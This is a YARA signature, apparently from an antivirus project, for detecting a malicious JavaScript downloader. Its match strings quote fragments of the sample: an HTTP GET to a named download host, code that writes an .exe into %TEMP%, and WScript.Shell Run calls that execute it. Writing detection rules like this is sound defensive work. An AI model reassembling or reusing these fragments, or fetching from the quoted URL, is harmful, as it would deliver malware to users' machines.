rule sig_20160329_6c0ea9124d524a7250cb88be6f17f019 {
  meta:
    description = "datamaliciousorder - file 20160329_6c0ea9124d524a7250cb88be6f17f019.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0c5ba6e3d9d3df3d7b86c361c75b88cee925c9f60d79faca53b5b3abc3b962aa"

  strings:
    $s1  = "R[Po](\"GET\", \"http://fittedcarmats.com/m4usa\", false);" fullword ascii
    $s2  = "function h() {return Ge[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"wJPoVKZQWocQkLx.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[C](D() * 11); if (R[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Ge = function e() {return WScript[rn](\"WScript.Shell\");}(), Z = 11;" fullword ascii
    $s5  = "function d(XM, n){ua = ua * 1; return XM - n;};" fullword ascii
    $s6  = "function vQ(){return \"\" + e0;};" fullword ascii
    $s7  = "function cy() {return ((aV == true) && (aV == A0)) ? 1 : ua;};" fullword ascii
    $s8  = "function f(J){Ge[\"Run\"](J, ua, ua);};" fullword ascii
    $s9  = "function D(){return 22;};" fullword ascii
    $s10 = " while (g){" fullword ascii
    $s11 = "return d(WV, bb);" fullword ascii
    $s12 = "var f0 = new this[\"Date\"]();" fullword ascii
    $s13 = "function LD()" fullword ascii
    $s14 = "function A(){return rn;};" fullword ascii
    $s15 = "function pn(Yf) {var a = (1, 2, 3, 4, 5, Yf); return a;};" fullword ascii
    $s16 = "var A0 = false;" fullword ascii
    $s17 = "A0 = true; " fullword ascii
    $s18 = "var Lb = false;" fullword ascii
    $s19 = "var aV = false;" fullword ascii
    $s20 = "aV = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}